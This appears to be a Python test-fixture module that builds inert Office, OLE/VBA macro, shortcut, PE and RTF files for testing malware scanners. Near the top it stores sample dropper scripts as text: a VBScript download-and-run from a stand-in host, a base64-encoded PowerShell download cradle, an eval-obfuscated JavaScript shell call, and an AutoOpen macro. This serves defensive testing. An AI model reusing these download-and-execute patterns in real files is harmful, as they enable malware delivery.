"""Inert test files for deep content analysis, built at test time (nothing here can run).

Each builder follows the published layout of its format (MS-SHLLINK, MS-CFB, MS-OVBA, the PE header,
Office Open XML) so the scanners are tested against structure rather than against canned bytes.
Scripts are text that only LOOKS like what a dropper does: it is never executed by anything.
"""

import base64
import io
import math
import random
import struct
import zipfile

# ---- script samples (text only) ----------------------------------------------------------------

VBS_DROPPER = (
    'Set http = CreateObject("MSXML2.XMLHTTP")\r\n'
    'http.Open "GET", "http://payload-host.test/stage2.exe", False\r\n'
    "http.Send\r\n"
    'Set sh = CreateObject("WScript.Shell")\r\n'
    'sh.Run "cmd /c C:\\temp\\a.exe"\r\n'
)
VBS_BENIGN = "Dim a\r\na = 1 + 2\r\nMsgBox a\r\nOn Error Resume Next\r\n"
_PS_INNER = "IEX (New-Object Net.WebClient).DownloadString('http://evil-site.test/a.ps1')"
PS_ENCODED = "powershell.exe -enc " + base64.b64encode(_PS_INNER.encode("utf-16-le")).decode()
PS_BENIGN = "param($Path)\r\nGet-ChildItem $Path | Write-Host\r\n$x = Get-Date\r\n"
JS_EVAL = (
    "var a = '"
    + base64.b64encode(b"var s=new ActiveXObject('WScript.Shell');s.Run('calc');").decode()
    + "';\r\neval(atob(a));\r\nfunction f() { return 1; }\r\n"
)
BAT_BENIGN = "@echo off\r\nsetlocal\r\necho hello\r\n"
EICAR = (
    b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
)  # never written to disk


def b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def b64_utf16(text: str) -> str:
    """PowerShell's -EncodedCommand form: Base64 of UTF-16LE text."""
    return base64.b64encode(text.encode("utf-16-le")).decode()


def chr_codes(text: str) -> str:
    """VBScript that spells `text` with Chr() calls: a classic way to hide a word."""
    return " & ".join(f"Chr({ord(c)})" for c in text)


# ---- shortcut (.lnk), MS-SHLLINK ---------------------------------------------------------------


def lnk(target: str = r"C:\Windows\System32\cmd.exe", args: str = "", icon: str = "") -> bytes:
    flags = 0x01 | 0x08 | 0x80  # item id list, relative path, unicode strings
    if args:
        flags |= 0x20
    if icon:
        flags |= 0x40
    header = bytearray(76)
    struct.pack_into("<I", header, 0, 0x4C)  # header size
    header[4:20] = bytes.fromhex("0114020000000000c000000000000046")  # the shortcut class id
    struct.pack_into("<I", header, 20, flags)
    out = bytearray(header)
    out += struct.pack("<H", 0)  # an empty item id list
    for text in (target, *([args] if args else []), *([icon] if icon else [])):
        out += struct.pack("<H", len(text)) + text.encode("utf-16-le")
    return bytes(out)


# ---- Office Open XML ---------------------------------------------------------------------------


def rels(*items: tuple[str, str, bool]) -> bytes:
    """(relationship type, target, external) -> a .rels part."""
    body = "".join(
        f'<Relationship Id="r{i}" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        f'relationships/{kind}" Target="{target}"'
        + (' TargetMode="External"' if ext else "")
        + "/>"
        for i, (kind, target, ext) in enumerate(items)
    )
    return f'<?xml version="1.0"?><Relationships xmlns="x">{body}</Relationships>'.encode()


def ooxml(parts: dict[str, bytes] | None = None, root: str = "word") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        files = {"[Content_Types].xml": b"<Types/>", f"{root}/document.xml": b"<w:document/>"}
        for name, data in {**files, **(parts or {})}.items():
            z.writestr(name, data)
    return buf.getvalue()


# ---- OLE compound file with a VBA macro: MS-CFB, MS-OVBA ---------------------------------------


def ovba_compress(data: bytes) -> bytes:
    """MS-OVBA 2.4.1 compression, greedy: literals and copy tokens, 4096-byte chunks."""
    out = bytearray(b"\x01")
    for start in range(0, len(data), 4096):
        chunk = data[start : start + 4096]
        body = bytearray()
        i = 0
        while i < len(chunk):
            flags, tokens = 0, bytearray()
            for bit in range(8):
                if i >= len(chunk):
                    break
                best_len, best_off = 0, 0
                bits = max(math.ceil(math.log2(i)) if i > 1 else 0, 4)
                max_len = (0xFFFF >> bits) + 3
                for off in range(1, min(i, 1 << bits) + 1):
                    n = 0
                    while n < max_len and i + n < len(chunk) and chunk[i + n - off] == chunk[i + n]:
                        n += 1
                    if n > best_len:
                        best_len, best_off = n, off
                if best_len >= 3:
                    flags |= 1 << bit
                    tokens += struct.pack("<H", ((best_off - 1) << (16 - bits)) | (best_len - 3))
                    i += best_len
                else:
                    tokens.append(chunk[i])
                    i += 1
            body.append(flags)
            body += tokens
        header = 0x8000 | 0x3000 | (len(body) + 2 - 3)
        out += struct.pack("<H", header) + body
    return bytes(out)


def _record(record_id: int, payload: bytes) -> bytes:
    return struct.pack("<HI", record_id, len(payload)) + payload


def vba_streams(source: str, module: str = "ThisDocument", pcode: bytes = b"") -> dict[str, bytes]:
    """The streams of a macro project. `pcode` stands in for the compiled part stored before the
    source (its length is the module's source offset, as in a real project)."""
    directory = (
        _record(0x0004, b"VBAProject")
        + _record(0x0019, module.encode())
        + _record(0x001A, module.encode())
        + _record(0x0031, struct.pack("<I", len(pcode)))
        + _record(0x002B, b"")
    )
    return {
        "VBA/dir": ovba_compress(directory),
        f"VBA/{module}": pcode + ovba_compress(source.encode("cp1252")),
        "PROJECT": b'ID="{00000000-0000-0000-0000-000000000000}"\r\n',
    }


def cfb(streams: dict[str, bytes]) -> bytes:
    """A compound file (512-byte sectors) holding these streams. A name with one slash puts the
    stream in a storage. Streams under 4096 bytes go in the mini stream, as in real Office files."""
    end, fatsect, none = 0xFFFFFFFE, 0xFFFFFFFD, 0xFFFFFFFF
    nodes: list[tuple[str, int, bytes]] = []  # (name, type, data); a node's id is its index + 1
    top_ids: list[int] = []
    kids: dict[int, list[int]] = {}
    folders: dict[str, int] = {}
    for path, data in streams.items():
        if "/" in path:
            folder, name = path.split("/", 1)
            if folder not in folders:
                nodes.append((folder, 1, b""))
                folders[folder] = len(nodes)
                top_ids.append(len(nodes))
                kids[len(nodes)] = []
            nodes.append((name, 2, data))
            kids[folders[folder]].append(len(nodes))
        else:
            nodes.append((path, 2, data))
            top_ids.append(len(nodes))
    count = len(nodes) + 1
    left, right, child = [none] * count, [none] * count, [none] * count
    for chain in (top_ids, *kids.values()):
        for a, b in zip(chain, chain[1:], strict=False):
            right[a] = b
    child[0] = top_ids[0] if top_ids else none
    for folder_id, members in kids.items():
        child[folder_id] = members[0]
    # allocate sectors: 0 = FAT, then the directory, the mini FAT, the mini stream, the big streams
    mini_data = bytearray()
    mini_fat: list[int] = []
    big: list[tuple[int, bytes]] = []
    starts: dict[int, tuple[int, int]] = {}
    for node_id, (_name, kind, data) in enumerate(nodes, start=1):
        if kind != 2:
            starts[node_id] = (none, 0)
        elif len(data) < 4096:
            first = len(mini_data) // 64
            units = max(math.ceil(len(data) / 64), 1)
            mini_fat += [first + u + 1 if u < units - 1 else end for u in range(units)]
            mini_data += data.ljust(units * 64, b"\x00")
            starts[node_id] = (first, len(data))
        else:
            big.append((node_id, data))
    dir_sectors = math.ceil(count / 4)
    next_sector = 1 + dir_sectors
    minifat_sector = none
    if mini_fat:
        minifat_sector, next_sector = next_sector, next_sector + 1
    mini_start = none
    mini_sectors = math.ceil(len(mini_data) / 512)
    if mini_sectors:
        mini_start, next_sector = next_sector, next_sector + mini_sectors
    fat = [none] * 128
    fat[0] = fatsect
    for s in range(1, 1 + dir_sectors):
        fat[s] = s + 1 if s < dir_sectors else end
    if mini_fat:
        fat[minifat_sector] = end
    for s in range(mini_sectors):
        fat[mini_start + s] = mini_start + s + 1 if s < mini_sectors - 1 else end
    body = bytearray()
    for node_id, data in big:
        sectors = math.ceil(len(data) / 512)
        first = next_sector
        for s in range(sectors):
            fat[first + s] = first + s + 1 if s < sectors - 1 else end
        starts[node_id] = (first, len(data))
        body += data.ljust(sectors * 512, b"\x00")
        next_sector += sectors

    def entry(name: str, kind: int, node_id: int, start: int, size: int) -> bytes:
        raw = name.encode("utf-16-le")[:62]
        return (
            raw.ljust(64, b"\x00")
            + struct.pack("<HBB", len(raw) + 2, kind, 1)
            + struct.pack("<III", left[node_id], right[node_id], child[node_id])
            + b"\x00" * 36
            + struct.pack("<IQ", start, size)
        )

    entries = bytearray(entry("Root Entry", 5, 0, mini_start, len(mini_data)))
    for node_id, (name, kind, _data) in enumerate(nodes, start=1):
        start, size = starts[node_id]
        entries += entry(name, kind, node_id, start, size)
    entries = entries.ljust(dir_sectors * 512, b"\x00")
    header = bytearray(512)
    header[0:8] = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
    struct.pack_into("<HHHHH", header, 24, 0x3E, 3, 0xFFFE, 9, 6)
    struct.pack_into("<IIIIII", header, 40, 0, 1, 1, 0, 4096, minifat_sector)
    struct.pack_into("<IIII", header, 64, 1 if mini_fat else 0, end, 0, 0)
    struct.pack_into("<109I", header, 76, 0, *([none] * 108))
    minifat_bytes = b""
    if mini_fat:
        minifat_bytes = struct.pack(f"<{len(mini_fat)}I", *mini_fat).ljust(512, b"\xff")
    return (
        bytes(header)
        + struct.pack("<128I", *fat)
        + bytes(entries)
        + minifat_bytes
        + bytes(mini_data).ljust(mini_sectors * 512, b"\x00")
        + bytes(body)
    )


def ole_with_macro(source: str, pcode: bytes = b"") -> bytes:
    return cfb(vba_streams(source, pcode=pcode))


def biff_workbook(sheets: list[tuple[int, int, str]], auto_open: bool = False) -> bytes:
    """A compound file holding a BIFF8 workbook stream: only the workbook-global part, with
    BoundSheet8 records (state, type, name) and optionally the built-in Auto_Open name. Type 1 is
    an Excel 4.0 macro sheet; state 0 visible, 1 hidden, 2 very hidden."""

    def rec(rid: int, data: bytes = b"") -> bytes:
        return struct.pack("<HH", rid, len(data)) + data

    out = rec(0x0809, struct.pack("<HHHHII", 0x0600, 0x0005, 0, 0, 0, 0x06))
    for state, kind, name in sheets:
        out += rec(
            0x0085, struct.pack("<IBB", 0, state, kind) + bytes([len(name), 0]) + name.encode()
        )
    if auto_open:
        out += rec(0x0018, struct.pack("<HBBHHH", 0x0020, 0, 1, 0, 0, 1) + bytes(4) + b"\x00\x01")
    out += rec(0x000A)
    return cfb({"Workbook": out})


MACRO_AUTOEXEC_SHELL = (
    "Sub AutoOpen()\r\n"
    '  Set sh = CreateObject("WScript.Shell")\r\n'
    '  sh.Run "cmd /c calc"\r\n'
    "End Sub\r\n"
)
MACRO_QUIET = 'Sub Helper()\r\n  Range("A1").Value = 1\r\nEnd Sub\r\n'


# ---- a program (PE) ----------------------------------------------------------------------------


def pe(packed: bool = False, rwx: bool = False, strings: bytes = b"") -> bytes:
    """A minimal PE image: one section. `packed` makes it high-entropy; `strings` are appended
    (imports are only searched for by name)."""
    lfanew = 0x80
    stub = (
        b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21"
        b"This program cannot be run in DOS mode."
    )
    dos = (b"MZ" + b"\x00" * 58 + struct.pack("<I", lfanew) + stub).ljust(lfanew, b"\x00")
    optional = struct.pack("<H", 0x10B) + b"\x00" * 94 + b"\x00" * (16 * 8)
    coff = struct.pack("<HHIIIHH", 0x14C, 1, 0, 0, 0, len(optional), 0x102)
    raw_size = 8192
    rng = random.Random(7)
    section = rng.randbytes(raw_size) if packed else (b"\x90\x00\x00\x00" * (raw_size // 4))
    flags = 0x60000020 | (0x80000000 if rwx else 0)
    table = struct.pack(
        "<8sIIIIIIHHI", b".text", raw_size, 0x1000, raw_size, 0x200, 0, 0, 0, 0, flags
    )
    headers = (dos + b"PE\x00\x00" + coff + optional + table).ljust(0x200, b"\x00")
    return headers + section + strings


def rtf_with_object(equation: bool = False, template: str = "") -> bytes:
    body = "{\\rtf1{\\object\\objemb" + ("{\\*\\objclass Equation.3}" if equation else "")
    body += "{\\*\\objdata 0102030405}}"
    if template:
        body += "{\\*\\template " + template + "}"
    return (body + "}").encode()
